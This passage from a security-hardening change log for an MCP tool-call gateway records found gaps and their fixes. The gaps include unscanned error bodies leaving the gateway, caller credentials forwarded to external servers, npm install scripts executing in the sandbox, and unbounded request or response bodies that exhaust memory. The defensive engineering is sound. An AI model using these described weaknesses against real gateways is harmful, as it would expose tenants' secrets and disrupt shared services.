      has_pii true raw / false fixed. Evidence mcp-parallel/findings/backstop-p-internal-http-result-scan/
      finding.md. Result-egress redaction now at FULL PARITY across org / sandbox / legacy-httpx internal paths.
      CHG-0061 (2026-07-02, HIGH — ext_mcp_proxy non-200 / non-JSON egress leak): the tenant-facing
      external passthrough ext_mcp_proxy (/v1/mcp/ext-proxy/{host}/{path}) ran its outbound result/error
      redaction floor ONLY on status==200 JSON bodies — so a NON-JSON body (HTML/text/xml error page;
      resp.json() raises) was returned verbatim, and a NON-200 JSON body bypassed both scan branches
      (gated ==200) → returned raw. A secret/PII/infra string in a non-200 or non-JSON error body egressed
      to the tenant unscanned (contradicts CHG-0043's scan-error-content intent, only wired for 200). FIX
      (mcp_proxy.py): import re + _is_text_content_type(); non-JSON text-like bodies scanned via
      _scan_tool_result_floor (WITHHELD on block/error; binary passed through untouched); dropped the
      status==200 gate from result+error scans (any status) + new elif for non-200 bodies without
      result/error (scan whole body). 200-without-result/error untouched (no behaviour change). +6 tests.
      Gate: 39 ext-proxy + 1220 gateway passed, 0 failed. ORG path unaffected (sandbox-routed via broker →
      parsed dict, same floor). Evidence: mcp-parallel/findings/backstop-p2-ext-proxy-nonok-egress/finding.md.
- [x] 3. Per-user/agent/role tool authorization (close the mcp_proxy.py:302-305 gap; actor-keyed).
      DONE via CHG-0006+0007+0008 (2026-07-02). Per-actor tool ACCESS authorization (block/allow by
      user/agent/role) is enforced + tested across ALL paths: HTTP (MCPToolCallView), stdio/ws ADAPTER
      (scan orchestrator: evaluate_mcp_policies(actor) + _policy_applies_to_actor + CHG-0007 rule-block
      honoring, end-to-end proof in test_scan_enforces_actor_scoped_block_on_adapter_path), and per-key
      controls on the bare REST route (CHG-0006 allowlist/cap/disabled). Finding #1 was IMPRECISE (actor
      IS used for an access decision, one layer down); the mcp_proxy.py:301-307 cache-key TODO is a
      documented non-issue (tool enable/disable is server-scoped by design). Finding #4 was a FALSE
      POSITIVE (CHG-0007). Gate: 27 authz/scoping tests + 427 broad sweep pass.
      CHG-0038 (2026-07-02): extended per-key authz from EXECUTION to VISIBILITY. mcp_allowed_tools was
      enforced at tools/CALL (_tool_allowed_by_key -> 403, CHG-0006) but tools/LIST filtered ONLY by the
      server disabled set — a restricted key SAW tools it would be 403'd on (info disclosure + least-privilege
      gap). Added _filter_tools_by_key_allowlist (empty allowlist = all visible) layered after
      _filter_tools_by_enabled at all 4 tools/list sites (org_mcp_jsonrpc adapter+backend branches + REST
      org_mcp_tools_list, now resolving _get_auth_context). A key allowlisted to echo sees only echo. +2 tests;
      test_mcp_bare_proxy_scan.py 22 passed, broad sweep 1083 passed.
- [x] 3b. Per-policy FIELD-level redaction (redaction_fields) on the stdio/ws adapter path (split from #3).
      HTTP path (MCPToolCallView, control views.py:1113) masks specific NAMED result fields for matched
      actor-scoped policies via apply_field_redaction/redact_structured; the gateway policy engine/bundle
      has NO field-redaction support (only redaction_hints), so the adapter path does content-scan but not
      field-level RBAC masking. Needs a bundle-format extension: add redaction_fields to compiled policies
      + gateway EvaluationResult + apply on the adapter response. Cross-cutting (control compiler + gateway).
      PARTIAL — CHG-0006 (2026-07-02): finding #2 closed. org_mcp_tool_call (bare REST route) now enforces
      the three per-key gates it lacked — _tool_allowed_by_key (403), mcp_max_tool_calls cap (429),
      _is_tool_disabled (403) — before forwarding, at parity with org_mcp_jsonrpc. +4 tests; 18 bare-proxy
      passed, broad sweep 424 passed. REMAINING before [x]: (#1, the big one) per-actor authz + field-RBAC
      masking NOT enforced on stdio/ws ADAPTER path (actor threaded for scan attribution only; enabled-tools
      payload has no actor dimension); (#3) Tier-1/2 policy BLOCK gated on posture not the rule's action
      (actor-scoped block downgraded to tag under default posture, mcp_scan_orchestrator.py); (#4)
      _policy_applies_to_actor allowlist-scope inverts intent (policy_engine.py).
      CHG-0007 (2026-07-02): #3 FIXED — Tier-1 policy scan (_scan_text_tier1) now honors a matched rule's
      own action='block' under any non-monitor posture (was downgraded to tag under default posture; the
      stdio/ws adapter path bypasses the backend that re-enforces the rule — now at parity with the
      control-plane engine). +2 tests; orchestrator 15 passed, broad sweep 427 passed.
      #4 DISMISSED as FALSE POSITIVE — _policy_applies_to_actor is a policy-SCOPING primitive (allowed_* =
      actors the policy APPLIES to; documented + mirrors control-plane engine); "block scoped to admins"
      is coherent scoping, NOT an inversion. Inverting would break the contract + control-plane parity +
      existing policies. Do NOT touch it. The auditor conflated scoping with the ABSENT deny-by-default
      per-actor tool-authz primitive (= finding #1).
      REMAINING before [x]: finding #1 (the big one) — per-actor user/agent/role tool authz + field-RBAC
      masking on the stdio/ws ADAPTER path (enabled-tools payload needs an actor dimension, or route the
      adapter path through actor-scoped policy eval).
      CHG-0024 (2026-07-02): field-RBAC HALF of finding #1 DONE. The compiler already emits
      Policy.redaction_fields into the bundle (compiler.py:521, M-04) and the control HTTP path masks those
      named tool-RESULT fields, but the gateway never consumed them — adapter path did content-scan yet NO
      field-level masking. Now: gateway EvaluationResult.redaction_fields (collected from matched actor-scoped
      policies in both evaluate() + evaluate_mcp_policies()), a Django-free port of apply_field_redaction
      (NFKC/case-insensitive keys, bounded, non-mutating), applied on the OUTPUT structured payload via
      scan_mcp_payload._finalize_output — scoped by actor, output-only, suppressed under monitor, audited via
      McpScanResult.redacted_fields + meta. +7 tests; test_mcp_scan_orchestrator.py 22 passed, broad sweep
      1056 passed. Backward-compat: redaction_fields=[] → no-op. STILL OPEN (advanced, not [x]): (a) cross-
      stage parity — control uses the INPUT-stage policy match to project fields out of the RESPONSE; the
      gateway currently triggers on an OUTPUT-scan match (thread input-stage redaction_fields into the output
      scan for full parity); (b) live drive proving field masking on a real adapter tool-call. (The per-actor
      ACCESS-authz half of finding #1 is already enforced via CHG-0006/0007/0008.)
      CHG-0025 (2026-07-02): DONE → item 3b [x]. Cross-stage input-triggered field projection added. The RBAC
      "role X never sees field F" pattern authors its rule on the CALL, so the INPUT-stage policy match now
      projects the declared redaction_fields out of the RESPONSE (control HTTP-path parity): the input scan
      surfaces policy_redaction_fields in its meta; org_mcp_jsonrpc threads it (_in_rfields) into both adapter
      OUTPUT scans as extra_redaction_fields; the orchestrator masks those fields; apply_field_redaction
      returns identity on a no-op; the adapter swap gate also fires on redacted_fields so a finding-less
      projection isn't discarded. +5 orchestrator tests, +2 END-TO-END adapter tests (real org_mcp_jsonrpc,
      real policy eval, byte-level: account_number masked in the adapter RESPONSE while non-targeted content
      survives; dormant guard when no policy). Gate: 37 relevant + 1063 broad sweep passed. Both trigger
      directions (output-content CHG-0024 + input-call CHG-0025) covered on the adapter path. RESIDUAL
      (non-blocking, out of 3b's adapter scope): bare-REST/ext-proxy cross-stage (separate surface; legacy
      direct-backend path covered by control's own MCPToolCallView field redaction) + optional live-stack
      drive over the in-process byte-level e2e proof.
- [x] 4. Context minimization / least-privilege assembly.
      RESOLVED N-A for MCP — CHG-0021 (2026-07-02): the MCP tool-call path has NO separate context-assembly
      step (unlike chat, where minimize_context prunes message history by token budget). Least-privilege for
      MCP = minimal forwarding (gateway forwards ONLY the tool args — echo returns just `message`, no user
      identity/session/context injected; enforced_at=gateway_adapter, not leaked to the tool) + result
      redaction (item 2) + per-actor authz (item 3). minimize_context (context_assembler.py) is the chat/LLM
      path only. Live-verified via the per-call chain evidence.
      Evidence: mcp-parallel/findings/backstop-p6-per-call-chain/per_call_chain_evidence.txt.
      CHG-0033 (2026-07-02, HIGH): NEW least-privilege/credential-leak finding on the ext-proxy path (distinct
      from the MCP tool-call minimize, which is N-A). ext_mcp_proxy forwarded the caller's request headers
      verbatim (only host/content-length/transfer-encoding stripped) to the third-party external MCP server —
      so the caller's Authorization: Bearer <gateway-API-key>, Cookie, and X-Api-Key egressed to the external
      domain (replayable against the gateway). The sandbox-routed path (broker_send_rpc) already built a clean
      header set + injected only the server's OWN OAuth token, so this was ext-proxy-only. FIX: new
      _ext_proxy_forward_headers strips hop-by-hop + credential/identity headers (authorization/proxy-
      authorization/cookie/set-cookie/x-api-key) + any x-gateway-* header, and injects the gateway's stored
      OAuth bearer for the upstream (if any) as the SOLE Authorization. +2 tests; test_mcp_bare_proxy_scan.py
      20 passed, broad sweep 1077 passed. Now the external server receives ONLY safe/protocol headers + its own
      token; the caller's gateway key never leaves the gateway.
- [x] 5. Compliance tagging: extend mcp_compliance_tags.py to PII/IP/regulated; tag inputs + results; enforce by tag; audit.
      LIVE VERIFIED (mostly done) — CHG-0017 (2026-07-02): sent PII through the live gateway + queried
      MCPEvents. Redaction comprehensive (ssn/card/email all masked, combined too, 0 leak). compliance_tags
      recorded AND COMPLETE (email-only→['GDPR','PII']; email+ssn→['GDPR','HIPAA','PII']). decision=redact
      under default tag posture (E12 floor CHG-0005). So tag inputs+results, enforce-by-tag (via redaction),
      and audit ALL WORK — refutes the audit's "tags audit-only/no enforcement" framing. THE ONE REMAINING
      GAP before [x]: vocabulary mismatch — gateway emits GDPR/HIPAA/PII/PCI-DSS/… but the ComplianceTag
      catalog uses GDPR-PII/HIPAA-PHI/PCI-CARD/…, so MCPEvent.compliance_tags joins ZERO catalog rows
      (catalog reporting broken for gateway events). Fix = unify vocab onto ComplianceTag.code (cross-plane:
      gateway patterns.py + control catalog/migration; breaks 8 gateway tests) — owning-session semantic
      decision, NOT a unilateral backstop edit. Evidence: mcp-parallel/findings/backstop-p5-compliance-tags/.
      CHG-0030 (2026-07-02): the "extended to PII/IP/regulated" COVERAGE gap (distinct from the vocab mismatch
      above) CLOSED for IP/infra. detect_ip_leakage + IP_LEAKAGE_PATTERNS (internal IPv4/hostname/URL + private
      file paths -> INFRA tag) already ran on the CHAT output_guard but the MCP scan (_scan_text_tier1) ran ONLY
      detect_pii/detect_secrets — so internal host/IP/path in a tool RESULT was never detected/tagged/redacted.
      Now folded into the pii/secret fallback: ip_leakage finding -> INFRA-tagged (get_compliance_tags) +
      posture-enforced (block/redact/monitor). Fail-closed byte-check (redact_all covers internal IP/host/URL
      but NOT file paths -> if a detected internal value survives the scrub under redact, BLOCK — no
      redact-that-leaks). Public IPs not flagged. +5 tests; test_mcp_scan_orchestrator.py 32 passed, broad sweep
      1069 passed. STILL OPEN (item 5): the gateway INFRA/SECRET/PII vocab vs control ComplianceTag catalog
      codes (GDPR-PII/...) mismatch for catalog-join reporting — the cross-plane vocab decision.
      CHG-0059 (2026-07-02) — RESIDUAL CLOSED → item 5 [x]. The vocab mismatch is fixed by normalizing at the
      audit WRITE boundary instead of changing the gateway source (the reason prior iterations deferred it:
      changing patterns.py breaks 8 gateway tests + is cross-plane + collision-prone). NEW to_catalog_codes()
      in shared/ai_mesh_shared/mcp_compliance_tags.py maps gateway-granular (GDPR/HIPAA/PII/PHI/PCI-DSS/SECRET/
      INFRA/SOC2) -> catalog codes (GDPR-PII/HIPAA-PHI/PCI-CARD/SOC2-CONF); idempotent; unknown tokens pass
      through (never drops a tag). Wired at control mcp_connector/tasks.py record_mcp_event_task (gateway
      ingestion — the site where granular vocab entered) + views.py _record_event (defense-in-depth), both
      exception-guarded. Also extended PRESET_TO_TAGS with internal-infra keys (internal_ipv4/internal_hostname/
      internal_url/file_path_unix/file_path_windows/ip_leakage -> SOC2-CONF) — item 5's literal "extend to IP"
      in the shared module. NO gateway change (patterns.py untouched → 8 gateway compliance tests stay green,
      no collision). GATE: 31 gateway vocab tests + 1207 gateway sweep + 6 control ingestion (gateway envelope
      ['GDPR','HIPAA','PII'] PERSISTS as ['GDPR-PII','HIPAA-PHI']) + 21 broader control passed (Django runner
      in a throwaway container w/ working-tree bind-mount on the compose net+DB; 2 unrelated pre-existing
      harness errors = pytest/fakeredis dev deps absent). RESIDUALS (documented, non-blocking): ITAR/FERPA
      have no detector producing them; the gateway still EMITS granular at source (consistency now enforced at
      the audit write boundary by design); ideal future = shared CATALOG_TAG_CODES as the single source-of-
      truth imported by control policy/compliance_tags.py. Evidence:
      mcp-parallel/findings/backstop-p5-compliance-vocab-normalize/finding.md.
- [x] 6. End-to-end per-tool-call chain: authz → minimize → scan+redact(in&result) → tag → audit.
      LIVE VERIFIED in order — CHG-0021 (2026-07-02): fired a PII tools/call, inspected the MCPEvent
      scan_trace/metadata. Chain executes in order on each call: authz (reached tool; org-key validated,
      cross-org=403 CHG-0016) -> minimize (N-A for MCP, item 4) -> scan+redact (scan_pipeline=two_tier;
      scan_trace = [tier1 input, tier1 output]; decision=redact via E12 floor CHG-0005) -> tag
      (compliance_tags=['GDPR','HIPAA','PII']) -> audit (MCPEvent w/ decision+tags+latency_ms+scan_trace+
      enforced_at=gateway_adapter). Evidence: mcp-parallel/findings/backstop-p6-per-call-chain/. NB: item 6
      is the CHAIN order (verified); the individual steps' remaining refinements are tracked under 3b (field
      RBAC redaction on adapter) + 5 (tag vocabulary catalog-join).

## G3 — Architecture hardening (log every edit)
- [x] 7. All transports (http/ws/sse/stdio) in the per-org gVisor sandbox; nothing in the backend (complete/fix if needed).
      VERIFIED STILL OPEN — CHG-0011 (2026-07-02, read-only; active-migration zone, did NOT edit). Broker
      side DONE (unified POST /{org}/rpc handles all transports, routes.py:296; agent dials HTTP+egress-
      allowlist). Gateway wiring INCOMPLETE: stdio→broker ✓ (adapter path, MCP_STDIO_IN_PROCESS=false);
      streamable-http/sse→control backend (mcp_proxy.py:2470 → /api/mcp-connector/tools/call/; backend calls
      upstream DIRECTLY, zero broker/BROKER_URL refs, docstrings 'directly to the upstream' views.py:412/601/727);
      websocket→in-gateway websockets.client.connect (mcp_ws_adapter.py:135). So http/sse/ws do NOT egress
      via the per-org sandbox → "nothing in the backend" UNMET; the "all 32 complete/all transports via
      sandbox" claim is inaccurate for the gateway wiring. NOT a data leak (1.4 result scan applies to
      http/sse per CHG-0005) — an ISOLATION gap (per-tenant egress). REMAINING before [x] (owning session):
      route gateway http/sse (org_mcp_jsonrpc else-branch / internal_tools_call direct-httpx) + websocket
      (mcp_ws_adapter.py) through broker_send_rpc (unified route already exists); prove NO transport's
      outbound call runs in the gateway/control backend.
      UPDATE — CHG-0018 (2026-07-02): the http/sse part of my CHG-0011 finding is RESOLVED by P4.13/P6.18.
      Gateway now routes stdio + streamable-http/sse via the sandbox: _is_sandbox_routed (mcp_proxy.py:1918)
      + _adapter_forward streamable-http/sse branch (1953-1978) uses broker_send_rpc (gateway builds
      upstream block, SANDBOX dials; gateway never connects). MCP_HTTP_VIA_SANDBOX default=true AND set true
      on the live gateway container. stdio live-verified (echo calls via sandbox). RESIDUAL: websocket STILL
      connects in-gateway (mcp_ws_adapter.py:135 websockets.client.connect, not migrated) — so
      "4-transport isolation active" OVERSTATES (3/4; ws unused live). REMAINING before [x]: migrate ws to
      broker_send_rpc (unified /{org}/rpc handles ws) OR document ws as legacy; independent live
      http-via-sandbox drive (register a streamable-http server, assert 0 direct upstream dials).
      CHG-0026 (2026-07-02): DONE → item 7 [x]. Migrated websocket onto the broker path. _adapter_forward now
      routes ws via broker_send_rpc (transport='websocket') alongside streamable-http/sse; the in-gateway
      mcp_ws_adapter.send_jsonrpc dial is REMOVED. Verified the broker + sandbox agent already support ws
      upstreams (routes.py unified /{org}/rpc for all 4 transports; upstream_manager session.ws;
      broker_send_rpc builds the upstream block for any non-stdio transport) — so this is a safe gateway-only
      migration that aligns _adapter_forward with _is_sandbox_routed's already-declared ws-sandbox-routed
      contract. Now ALL 4 transports (stdio+streamable-http+sse+websocket) egress via the per-org sandbox by
      default; gateway never dials upstream. +1 test (test_adapter_forward_websocket_uses_broker_send_rpc:
      asserts broker routing + in-gateway ws NOT dialed). Gate: 1064 gateway + 52 broker (ws/upstream/route/
      rpc/lifecycle) passed. CAVEAT: streamable-http/sse still honor MCP_HTTP_VIA_SANDBOX (default ON→sandbox,
      OFF→legacy direct-httpx); stdio+ws unconditional — so "nothing in the backend for ALL transports" holds
      for the DEFAULT config. mcp_ws_adapter now legacy (main.py reaper/shutdown hooks remain as benign
      no-ops). OPTIONAL follow-up: live ws-via-sandbox drive over the unit proof.
- [ ] 8. No unknown npm on host — proven.
      PROGRESS — CHG-0022 (2026-07-02): confirmed live gap (sandbox had npm_config_ignore_scripts but NOT
      the pin/allowlist envs; docker_manager._run_kwargs only set ignore_scripts, so the agent's pin/allowlist
      enforcement defaulted OFF/unreachable). FIXED: _run_kwargs now propagates MCP_STDIO_REQUIRE_PINNED_
      PACKAGES + MCP_STDIO_PACKAGE_ALLOWLIST into the sandbox env (default OFF pass-through, non-breaking —
      live UNPINNED "everything" servers still run). +1 broker test; test_sandbox_lifecycle.py 27 passed.
      REMAINING before [x]: (1) ENABLE in prod — set MCP_STDIO_REQUIRE_PINNED_PACKAGES=true (requires pinning
      every registered server's package spec); (2) bake a locked .npmrc/private registry into the sandbox
      image (registry still default public npmjs); (3) malicious-postinstall fixture proven inert via egress
      capture (audit's item-8 acceptance).
      CHG-0044 (2026-07-02, HIGH — corrects a CHG-0022 assumption): CHG-0022 assumed "sandbox HAD
      npm_config_ignore_scripts" — TRUE at the CONTAINER level (docker_manager:418) but it NEVER reached the
      actual npx child. The stdio server is spawned via create_subprocess_exec(env=_build_child_env(...)):
      env= REPLACES the process env, and _build_child_env rebuilds it FRESH from _SAFE_ENV_PASSTHROUGH, which
      OMITS npm_config_ignore_scripts. No baked .npmrc exists. So the npx child ran with ignore-scripts=false
      → install/postinstall lifecycle scripts of an untrusted tenant-registered package executed on fetch (the
      exact supply-chain RCE the container flag claimed to kill). FIX: _build_child_env
      (shared/ai_mesh_shared/mcp_stdio_common.py) force-pins npm_config_ignore_scripts=true unconditionally +
      LAST (server-spec/host env cannot override; package bin still runs). +3 tests (default true; server-spec
      false/''/0/no/FALSE all forced true; host false forced true). Gate: 19 stdio_common + 101 broker + 1092
      gateway passed. Evidence: mcp-parallel/findings/backstop-p8-npm-ignore-scripts/finding.md. NOTE: this
      closes the core RUNTIME gap; sub-items (1) prod-pin-enable, (2) baked .npmrc/private registry, (3) live
      malicious-postinstall egress-capture proof REMAIN (need a dedicated host) — so item 8 stays [ ].
- [ ] 9. Gateway auth/authz/validation/rate-limit/policy/audit — verified + hardened.
      LIVE VERIFIED (auth/authz/validation) — CHG-0016 (2026-07-02): probed the live gateway. Auth ENFORCED
      (no-auth→401, bad-key→401); CROSS-ORG key ISOLATION ENFORCED (org-a key on org-b endpoint→403
      org_scope_violation, and vice versa — auth-layer cross-tenant isolation, both directions); input
      validation GRACEFUL (missing-method/malformed-json/empty-tool → no 500). Rate-limit (S12) exists but a
      60-call burst didn't trip it (higher threshold). Policy authz already unit-proven (CHG-0006/0007/0008);
      audit wired (_record_gateway_event). Evidence: mcp-parallel/findings/backstop-p9-gateway-authz/.
      REMAINING before [x]: probe the rate-limit THRESHOLD (larger controlled burst — deferred to avoid
      throttling shared keys); adversarial policy-enforcement + audit-completeness checks.
      CHG-0031 (2026-07-02): rate-limit PARITY gap CLOSED on the bare REST route. _enforce_mcp_org_rate_limits
      (per-org TPM+burst/RPM, atomic Redis INCR, fail-open by design) was called ONLY by org_mcp_jsonrpc
      (mcp_proxy.py:2092); org_mcp_tool_call (bare REST /tools/call) had the per-KEY tool-call cap +authz
      (CHG-0006) but NOT the per-ORG rate limit — a tenant could exceed org burst/RPM/TPM via the bare route.
      Extracted _mcp_org_rate_limit_raw (plain 429 JSONResponse); the JSON-RPC route wraps it (unchanged), the
      bare route returns it as-is (REST 429 + Retry-After). +3 tests; test_mcp_rate_limit.py 7 passed, broad
      sweep 1072 passed. STILL OPEN (item 9): live threshold probe (controlled >150 req/s burst on a dedicated
      key/host); adversarial policy-enforcement + audit-completeness; ext_mcp_proxy (external passthrough) also
      lacks the per-org limiter (follow-up if tenant-exposed).
      CHG-0032 (2026-07-02): ext_mcp_proxy rate-limit follow-up CLOSED. The authenticated external MCP proxy
      (/v1/mcp/ext-proxy/{host}/{path}, behind auth middleware — NOT in EXCLUDED_PATHS, so org_slug is
      available) had inbound credential + SSE result scanning but NO per-org rate limit. Added
      _mcp_org_rate_limit_raw(_get_auth_context(request)) after the domain allowlist check (plain 429 before
      scan/forward). Now ALL THREE tenant-facing MCP entry points (org_mcp_jsonrpc, org_mcp_tool_call,
      ext_mcp_proxy) enforce the per-org TPM/burst/RPM ceiling → code-level rate-limit coverage COMPLETE. +3
      tests; test_mcp_rate_limit.py 10 passed, broad sweep 1075 passed. Item 9 still [ ]: live threshold probe
      (controlled >150 req/s on a dedicated key/host) + adversarial policy-enforcement + audit-completeness.
      CHG-0034 (2026-07-02): gateway VALIDATION/DoS gap CLOSED — the MCP routes buffered the whole body
      (request.body()/json()) with NO size ceiling (RAG/embeddings already 413-guard; MCP had none). Added
      _MCP_MAX_BODY_BYTES (default 10MiB, env MCP_MAX_BODY_BYTES) + _mcp_body_too_large() -> 413
      mcp_body_too_large BEFORE buffering, on all three entry points (org_mcp_jsonrpc, org_mcp_tool_call,
      ext_mcp_proxy). Also AUDITED the sibling gateway->upstream egress paths for the CHG-0033 credential-leak
      pattern: internal_discover_tools/internal_tools_call build CLEAN upstream headers from the server's own
      auth_token (+ is_safe_outbound_url SSRF guard) and the sandbox path (broker_send_rpc) too — so CHG-0033
      was the isolated leak. Non-invasive Content-Length pre-check. +4 tests; test_mcp_rate_limit.py 14 passed,
      broad sweep 1081 passed. LIMITATION (CLOSED by CHG-0063 2026-07-02): doesn't catch
      chunked-without-Content-Length.
      CHG-0063 (2026-07-02, HIGH — closes the CHG-0034 chunked limitation): _mcp_body_too_large only
      pre-checks the Content-Length HEADER, so a chunked / no-Content-Length body slipped past it and
      request.body()/json() buffered the whole stream into memory unbounded (gigabyte chunked body →
      gateway OOM), on all 3 tenant-facing entry points (ext_mcp_proxy, org_mcp_jsonrpc, org_mcp_tool_call).
      FIX (mcp_proxy.py): new _mcp_read_body_capped() reads request.stream() incrementally and raises
      _MCPBodyTooLarge the instant the running total crosses _MCP_MAX_BODY_BYTES (never holds > ceiling in
      memory); caches capped bytes on request._body so downstream json()/body() reuse it → 413. CL
      pre-check retained; org_mcp_jsonrpc keeps request.json() (pre-capped) so .json()-mocking doubles are
      unaffected; test-double fallback for objects without stream(). +7 tests (incl. e2e 413 on an oversized
      chunked stream + a stops-reading-early/bounds-memory assertion). Gate: 7 body-cap + 1237 gateway
      passed, 0 failed. Scope: tenant-facing routes (backend-internal X-Gateway-Internal-Key paths still
      plain body() — lower risk, future follow-up). Evidence:
      mcp-parallel/findings/backstop-p9-chunked-body-dos/finding.md. (Advances item 9 validation/DoS.)
      CHG-0045 (2026-07-02, MEDIUM — audit-completeness): the cross-tenant 403 org_scope_violation
      (authenticated key's org ≠ URL org) was only LOG.warning'd — NEVER recorded to the MCPEvent audit
      trail, so the most forensically important MCP event was invisible to audit/SIEM (while lesser
      per-key authz denials DID audit via CHG-0006). FIX: new async wrapper _audit_and_return_scope_error
      (mcp_proxy.py) calls _validate_org_scope (UNCHANGED — kept sync so ~13 test patch sites + direct-call
      unit tests stay valid) and on a 403 emits _record_gateway_event(decision=block,
      reason=org_scope_violation) attributed to the CALLER's real org (target_org + key_prefix in metadata,
      never leaks into the target's event stream); all 4 tenant routes (jsonrpc/tool_call/tools_list/
      server_health) now use it. 429 audit deliberately skipped (per-rejection audit under a burst would
      amplify load). +2 tests. Gate: 6 org-scope + 67 route-patch-site + 1094 gateway passed. Evidence:
      mcp-parallel/findings/backstop-p9-scope-violation-audit/finding.md. STILL OPEN (item 9): live
      rate-limit threshold probe (>150 req/s on a dedicated key/host) + adversarial policy-enforcement.
      CHG-0068 (2026-07-02, MEDIUM — audit-completeness on the ext-proxy path): ext_mcp_proxy recorded NO
      audit events (ZERO _record_gateway_event calls) while every other MCP path audits heavily — so on the
      untrusted external-passthrough surface, blocked credentials, blocked/redacted PII results, and blocked
      SSRF targets were INVISIBLE in the MCPEvent trail (breaks the ...→tag→audit chain for external tool
      usage). FIX (mcp_proxy.py): local async _ext_audit() calls the best-effort _record_gateway_event (org
      from auth ctx, server_slug=ext:<host>, fire-and-forget, no-op without org) at the enforcement points —
      SSRF block, credential-in-args block, result block, result redact. +4 tests. Gate: 49 ext + 1252
      gateway passed, 0 failed. Additive (no behaviour change). RESIDUAL: the allow path + infra-error
      withholds (non-200/non-JSON CHG-0061, response-too-large CHG-0064) not yet audited (follow-up).
      Evidence: mcp-parallel/findings/backstop-p9-ext-proxy-audit/finding.md.
      CHG-0070 (2026-07-02, MEDIUM — completes CHG-0068 self-correction): CHG-0068 audited ext_mcp_proxy's
      SSRF/credential/JSON-result block+redact but MISSED (1) the SSE result block (blocked SSE tool result
      egressed no audit while the JSON block did — inconsistent) and (2) any successful tool-call (usage
      unrecorded). FIX (mcp_proxy.py, reusing _ext_audit): audit the SSE result block, the SSE success
      (allow), and the JSON success (allow, in the elif of the redact branch — each call records exactly
      once: block XOR redact XOR allow). Allow gated on _ext_tool_name (no initialize/list flood). +2 tests.
      Gate: 51 ext + 1256 gateway passed, 0 failed. RESIDUAL: infra-error withholds (non-200/non-JSON,
      response-too-large) not yet audited. Evidence: mcp-parallel/findings/backstop-p9-ext-proxy-audit-complete/finding.md.
      NOTE (this iter, verification-only, no change): CROSS-TENANT isolation SOLID — all MCP caches keyed
      {org}/{server} (_server_config_cache, _enabled_tools_cache), OAuth tokens mcp:oauth:token:{org}|{url},
      tool-call cap mcp:toolcalls:{key_id} (org-bound), rate-limit ratelimit:{org}-scoped, config_sync
      _*_by_org; no non-org-scoped cache holds tenant data → no cross-tenant contamination vector. (Backs
      the cross-tenant-canary requirement + item 19.)
- [ ] 10. Resource limits CPU/mem/disk/timeout enforced + containment proven.
      LIVE VERIFIED (config) — CHG-0015 (2026-07-02): docker inspect of all 3 live org sandboxes shows
      CapDrop=[ALL], SecurityOpt=[no-new-privileges], Privileged=false, PidsLimit=256, Memory=2GiB,
      NanoCpus=1, ReadonlyRootfs=true, tmpfs /tmp noexec,nosuid, npm_config_ignore_scripts set. Strong
      containment deployed. REMAINING before [x]: prove CONTAINMENT under load (fork/mem/disk/timeout bombs
      + neighbor-safe) — but destructive bombs are UNSAFE on the shared live stack (item 17 needs an
      isolated host). Evidence: mcp-parallel/findings/backstop-p12-isolation-posture/.
      CHG-0064 (2026-07-02, HIGH — gateway-side mem-DoS from untrusted upstream, response-side twin of
      CHG-0063): ext_mcp_proxy buffered an untrusted external MCP server's WHOLE response via resp.aread()
      (SSE + JSON/text/binary) with NO size ceiling. The comment claimed "capped by the httpx timeout" but
      a timeout bounds TIME not SIZE — a malicious tenant-configured external server streams a multi-GB
      response fast → OOMs the SHARED gateway (cross-tenant DoS). FIX (mcp_proxy.py): new
      _MCP_MAX_RESPONSE_BYTES (env, default 10MiB) + _read_response_capped() iterates resp.aiter_bytes()
      and raises _MCPBodyTooLarge the instant the total crosses the ceiling; both aread() sites use it →
      withhold with 502 mcp_upstream_response_too_large. Non-finite SSE passthrough unchanged (streams
      chunk-by-chunk). Scope: ext-proxy untrusted boundary (ORG path sandbox-routed → gVisor mem/disk
      limits contain the sandbox). +5 tests (2 unit + 3 integration 502); existing 39 ext tests updated
      (response doubles expose aiter_bytes). Gate: 51 + 1242 gateway passed, 0 failed. Evidence:
      mcp-parallel/findings/backstop-p10-response-mem-dos/finding.md. (Gateway-side mem containment;
      sandbox-side containment [x]-tracked above still needs the isolated-host bomb drill.)
      CHG-0066 (2026-07-02, MEDIUM — sandbox-agent counterpart of CHG-0064): the per-tenant sandbox agent
      (services/mcp-broker/sandbox-image/agent/upstream_manager.py) dials the UNTRUSTED upstream via
      client.stream(); for a JSON (non-SSE) response it did `raw = await response.aread()` then check size
      — buffering the WHOLE streaming body before the check (multi-GB upstream → OOM/restart of that
      tenant's sandbox instead of clean 8MiB rejection). The SSE branch was already incremental; only the
      JSON branch had the anti-pattern. FIX: JSON branch reads via response.aiter_bytes() + running total,
      raising -32000 "upstream response too large" the instant it crosses _MAX_RESPONSE_BYTES (parity with
      SSE). +2 tests. Gate: 11 passed (-k "not websocket"; the 3 ws tests HANG pre-existingly in this env —
      unrelated, streamable-http-JSON-only change). Contained by sandbox 2GiB mem limit (CHG-0015).
      FOLLOW-UPS (documented): _read_json_response dead code (same pattern); error-body reads
      read-whole-then-slice; _validate_upstream lacks a resolved-IP SSRF check (sandbox analogue of
      CHG-0065, relevant while sandbox net internal=false). Evidence:
      mcp-parallel/findings/backstop-p10-sandbox-response-cap/finding.md.
      CHG-0069 (2026-07-02, MEDIUM — error-path counterpart of CHG-0066): the sandbox agent's
      streamable-http handler read an upstream error (status>=400) as `body = (await response.aread())[:500]`
      — aread() buffers the WHOLE untrusted error body before the slice, so a huge 4xx/5xx body OOMs/restarts
      that tenant's sandbox. FIX (upstream_manager.py): new async _aread_snippet(response, limit=1024) streams
      aiter_bytes() + stops at limit (never whole-body buffers); the error read uses it. +2 tests (500 →
      -32000 bounded snippet; _aread_snippet over 1000 chunks/limit=250 → ≤250B, ≤3 chunks consumed). Gate:
      15 passed (-k "not websocket"; ws tests hang pre-existingly). Contained by sandbox 2GiB limit.
      FOLLOW-UP: _read_json_response (~257-304) is dead code with the same whole-body error reads (remove in
      cleanup). Evidence: mcp-parallel/findings/backstop-p10-sandbox-error-body-cap/finding.md.
      NOTE (this iter, verification-only, no change): per-user/agent/role tool authz is SOLID — control
      policy engine _policy_applies_to_actor (engine.py:100-145) scopes policies by allowed_user_ids/
      agent_ids/roles with FAIL-CLOSED semantics (roleless/unknown-identity actor gets the policy applied);
      roles are server-derived from the API key (not caller-spoofable), forwarded via X-Gateway-Roles.
      Combined with per-key mcp_allowed_tools (CHG-0006/7/8) + field-level RBAC (CHG-0024/25), the mandate's
      "per-user/agent/role tool authorization" is implemented. (Backs item 9 authz.)
- [ ] 11. PostgreSQL + Redis schemas/usage/restart-safety verified.
